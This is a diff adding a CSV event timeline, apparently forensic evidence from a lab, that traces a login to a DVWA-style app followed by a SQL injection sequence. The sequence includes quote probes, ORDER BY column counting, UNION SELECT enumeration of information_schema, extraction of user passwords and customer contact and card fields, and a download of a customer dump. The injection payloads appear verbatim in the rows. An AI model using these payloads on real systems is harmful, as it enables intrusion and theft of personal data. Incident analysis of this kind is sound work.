@@ -1,0 +1,18 @@
+timestamp_utc,source,destination,event,evidence_ref
+2026-11-03T13:20:01.000+00:00,192.168.56.10,192.168.56.30,HTTP request: GET /login.php -> 200 (3927 B body),http.log uid=CrducnvRNv7KuzKrl depth=1
+2026-11-03T13:20:04.205+00:00,192.168.56.10,192.168.56.30,HTTP request: POST /login.php -> 302 (0 B body),http.log uid=CrducnvRNv7KuzKrl depth=2
+2026-11-03T13:20:04.610+00:00,192.168.56.10,192.168.56.30,HTTP request: GET /index.php -> 200 (3927 B body),http.log uid=CrducnvRNv7KuzKrl depth=3
+2026-11-03T13:20:07.115+00:00,192.168.56.10,192.168.56.30,HTTP request: GET /vulnerabilities/sqli/ -> 200 (3923 B body),http.log uid=CrducnvRNv7KuzKrl depth=4
+2026-11-03T13:20:10.120+00:00,192.168.56.10,192.168.56.30,HTTP request: GET /vulnerabilities/sqli/?id=1&Submit=Submit -> 200 (3954 B body),http.log uid=CrducnvRNv7KuzKrl depth=5
+2026-11-03T13:21:35.455+00:00,192.168.56.10,192.168.56.30,SQLi-pattern request: GET /vulnerabilities/sqli/?id=1'&Submit=Submit -> 200 (4095 B body),http.log uid=CvcBkIXeguzV9SJS4 depth=1
+2026-11-03T13:21:36.085+00:00,192.168.56.10,192.168.56.30,SQLi-pattern request: GET /vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit -> 200 (4159 B body),http.log uid=CvcBkIXeguzV9SJS4 depth=2
+2026-11-03T13:21:36.655+00:00,192.168.56.10,192.168.56.30,SQLi-pattern request: GET /vulnerabilities/sqli/?id=1' ORDER BY 1-- -&Submit=Submit -> 200 (3978 B body),http.log uid=CvcBkIXeguzV9SJS4 depth=3
+2026-11-03T13:21:37.379+00:00,192.168.56.10,192.168.56.30,SQLi-pattern request: GET /vulnerabilities/sqli/?id=1' ORDER BY 2-- -&Submit=Submit -> 200 (3978 B body),http.log uid=CvcBkIXeguzV9SJS4 depth=4
+2026-11-03T13:21:38.240+00:00,192.168.56.10,192.168.56.30,SQLi-pattern request: GET /vulnerabilities/sqli/?id=1' ORDER BY 3-- -&Submit=Submit -> 200 (3979 B body),http.log uid=CvcBkIXeguzV9SJS4 depth=5
+2026-11-03T13:21:38.726+00:00,192.168.56.10,192.168.56.30,"SQLi-pattern request: GET /vulnerabilities/sqli/?id=1' UNION SELECT 1,2-- -&Submit=Submit -> 200 (4016 B body)",http.log uid=CvcBkIXeguzV9SJS4 depth=6
+2026-11-03T13:21:39.342+00:00,192.168.56.10,192.168.56.30,"SQLi-pattern request: GET /vulnerabilities/sqli/?id=1' UNION SELECT user(),database()-- -&Submit=Submit -> 200 (4031 B body)",http.log uid=CvcBkIXeguzV9SJS4 depth=7
+2026-11-03T13:21:40.199+00:00,192.168.56.10,192.168.56.30,"SQLi-pattern request: GET /vulnerabilities/sqli/?id=1' UNION SELECT table_name,table_schema FROM information_schema.tables WHERE table_s -> 200 (4121 B body)",http.log uid=CvcBkIXeguzV9SJS4 depth=8
+2026-11-03T13:21:40.611+00:00,192.168.56.10,192.168.56.30,"SQLi-pattern request: GET /vulnerabilities/sqli/?id=1' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='cust -> 200 (4241 B body)",http.log uid=CvcBkIXeguzV9SJS4 depth=9
+2026-11-03T13:21:41.321+00:00,192.168.56.10,192.168.56.30,"SQLi-pattern request: GET /vulnerabilities/sqli/?id=1' UNION SELECT user,password FROM users-- -&Submit=Submit -> 200 (4345 B body)",http.log uid=CvcBkIXeguzV9SJS4 depth=10
+2026-11-03T13:21:42.067+00:00,192.168.56.10,192.168.56.30,"SQLi-pattern request: GET /vulnerabilities/sqli/?id=1' UNION SELECT id,CONCAT_WS(',',first_name,last_name,email,phone,card_last4) FROM c -> 200 (3978 B body)",http.log uid=CvcBkIXeguzV9SJS4 depth=11
+2026-11-03T13:22:12.874+00:00,192.168.56.10,192.168.56.30,HTTP request: GET /dump/customers.csv -> 200 (28370 B body),http.log uid=CkvyuC85Qc7Avk4ak depth=1
